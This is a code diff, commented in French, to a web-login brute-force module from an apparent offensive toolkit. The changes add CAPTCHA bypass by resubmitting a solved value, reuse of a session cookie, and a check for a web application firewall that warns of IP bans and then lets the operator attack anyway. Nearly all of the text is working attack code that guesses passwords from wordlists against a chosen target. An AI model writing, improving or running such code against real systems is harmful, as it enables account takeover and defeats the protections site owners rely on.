@@ -3,17 +3,24 @@ import aiohttp
 import os 
 from core.reporter import add_finding
 from core.utils import resolve_wordlist
+from core.waf import detect_waf
 
-async def attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore):
-    """Effectue une tentative de connexion unique."""
+async def attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore, captcha_field="", captcha_val=""):
+    """Effectue une tentative de connexion unique avec support CAPTCHA."""
     data = {
         user_field: username,
         pass_field: password
     }
     
+    # Injection du CAPTCHA résolu manuellement si fourni
+    if captcha_field and captcha_val:
+        data[captcha_field] = captcha_val
+    
     async with semaphore:
         try:
-            async with session.post(url, data=data, timeout=5, allow_redirects=True) as resp:
+            # Correction Pylance : Utilisation d'un objet ClientTimeout
+            timeout = aiohttp.ClientTimeout(total=5)
+            async with session.post(url, data=data, timeout=timeout, allow_redirects=True) as resp:
                 content = await resp.text()
                 
                 # Si le message d'échec n'est PAS dans la réponse, c'est peut-être un succès
@@ -24,10 +31,25 @@ async def attempt_login(session, url, username, password, user_field, pass_field
             pass
     return None
 
-async def start_brute(url, username, wordlist_path, user_field, pass_field, fail_msg, threads):
+async def start_brute(url, username, wordlist_path, user_field, pass_field, fail_msg, threads, cookie_str="", captcha_field="", captcha_val=""):
     print(f"[*] Lancement du Brute Force sur {url} (Cible: {username})")
     
-    # --- MODE CASCADE (AUTO-PILOT) ---
+    # ==========================================
+    # 1. PRÉPARATION DU BYPASS (SESSION / CAPTCHA)
+    # ==========================================
+    cookies = {}
+    if cookie_str:
+        print(f"[\033[94m*\033[0m] Session Fixation activée : {cookie_str}")
+        if '=' in cookie_str:
+            key, val = cookie_str.split('=', 1)
+            cookies[key.strip()] = val.strip()
+
+    if captcha_field and captcha_val:
+        print(f"[\033[94m*\033[0m] Bypass CAPTCHA activé : Injection de [{captcha_field}={captcha_val}]")
+
+    # ==========================================
+    # 2. MODE CASCADE (AUTO-PILOT)
+    # ==========================================
     wordlists_to_try = []
     if wordlist_path == "auto":
         print("[\033[94m*\033[0m] Mode Auto-Pilot activé : Lancement de la cascade.")
@@ -39,7 +61,8 @@ async def start_brute(url, username, wordlist_path, user_field, pass_field, fail
     
     semaphore = asyncio.Semaphore(threads)
     
-    async with aiohttp.ClientSession() as session:
+    # On passe le cookie de session persistant directement ici !
+    async with aiohttp.ClientSession(cookies=cookies) as session:
         for wl_name in wordlists_to_try:
             real_path = resolve_wordlist(wl_name)
             if not real_path:
@@ -54,13 +77,13 @@ async def start_brute(url, username, wordlist_path, user_field, pass_field, fail
                         password = line.strip()
                         if not password: continue
                         
-                        tasks.append(attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore))
+                        # Ajout des champs captcha à la tâche
+                        tasks.append(attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore, captcha_field, captcha_val))
                 
                 if not tasks:
                     continue
 
                 # --- L'AMÉLIORATION ASYNCHRONE : EARLY EXIT ---
-                # as_completed nous permet de traiter les réponses dès qu'elles arrivent
                 for coro in asyncio.as_completed(tasks):
                     res = await coro
                     if res:
@@ -77,7 +100,33 @@ async def start_brute(url, username, wordlist_path, user_field, pass_field, fail
 
 def run_brute_custom(args):
     """Wrapper pour arsenal.py"""
-    asyncio.run(start_brute(
-        args.url, args.user, args.wordlist, 
-        args.user_field, args.pass_field, args.fail, args.threads
-    ))
+    
+    # ==========================================
+    # PRE-FLIGHT CHECK : DÉTECTION DE WAF
+    # ==========================================
+    has_waf, reason = asyncio.run(detect_waf(args.url))
+    if has_waf:
+        print(f"\n[\033[93m!\033[0m] \033[1mATTENTION : WAF DÉTECTÉ SUR LA CIBLE !\033[0m")
+        print(f"    -> Raison : {reason}")
+        print("    -> Risque : Bannissement IP très probable en mode Brute-Force.")
+        choix = input("[?] Voulez-vous engager la cible quand même ? (o/N) : ")
+        if choix.lower() != 'o':
+            print("[-] Tir annulé. Retour à la base.")
+            return
+
+    # ==========================================
+    # LANCEMENT
+    # ==========================================
+    # Récupération défensive des nouveaux arguments optionnels
+    cookie = getattr(args, 'cookie', '')
+    c_field = getattr(args, 'captcha_field', '')
+    c_val = getattr(args, 'captcha_val', '')
+
+    try:
+        asyncio.run(start_brute(
+            args.url, args.user, args.wordlist, 
+            args.user_field, args.pass_field, args.fail, args.threads,
+            cookie, c_field, c_val
+        ))
+    except KeyboardInterrupt:
+        print("\n[-] Brute-Force interrompu par l'utilisateur.")
